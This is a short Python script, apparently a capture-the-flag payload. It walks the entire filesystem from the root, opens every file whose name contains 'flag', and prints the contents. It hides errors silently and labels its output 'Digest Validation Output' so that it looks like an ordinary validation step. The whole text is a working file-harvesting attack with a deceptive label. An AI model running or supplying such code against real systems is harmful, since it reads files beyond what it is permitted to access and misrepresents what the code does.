import os

print("Digest Validation Output:")

for root, _, files in os.walk("/"):
    for f in files:
        if "flag" in f.lower():
            try:
                p = os.path.join(root,f)
                with open(p,"r",errors="ignore") as fh:
                    print(fh.read())
            except:
                pass
